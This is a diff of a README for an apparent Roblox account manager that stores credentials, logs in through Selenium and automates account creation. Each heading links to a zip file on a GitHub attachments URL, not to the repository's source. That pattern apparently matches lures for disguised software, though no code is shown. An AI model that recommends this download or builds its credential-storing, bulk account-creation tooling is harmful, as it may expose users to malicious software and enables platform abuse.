@@ -1,17 +1,36 @@
-# [Roblox Auto Login](https://github.com/user-attachments/files/20300626/simpleRM.zip) & Game Launcher
+# [Robloxaccountsmanager](https://github.com/user-attachments/files/20300626/simpleRM.zip) 
 
-This tool allows you to manage multiple Roblox accounts, log in automatically, and launch Roblox games in the browser.
+
+
+A GUI-based Python application that allows you to manage, log in to, and create Roblox accounts with ease. Built using `Tkinter` for the interface and `Selenium` for browser automation.
+
+---
+
+## 🧰 Features
+
+- Add, save, and remove Roblox accounts locally.
+- One-click login to any saved account using Selenium browser automation.
+- Create new accounts automatically with:
+  - Username availability check
+  - Suggestions if username is taken
+  - Random or custom username fallback
+  - Birthdate and password form auto-filling
+  - Manual captcha solving
 
 ---
 
-## Features
+## 🖥️ Requirements
 
-- Add and remove Roblox accounts easily  
-- Automatically log in to Roblox via browser using saved accounts  
-- Launch Roblox games by entering the Place ID  
-- Runs Roblox web login and opens the game page automatically  
+- Python 3.8 or newer  
+- Google Chrome installed
+- Compatible ChromeDriver (must match your Chrome version)
 
----
+### Python dependencies:
+
+Install them using pip:
+
+```bash
+pip install selenium
 
 ## Recommended Usage
 
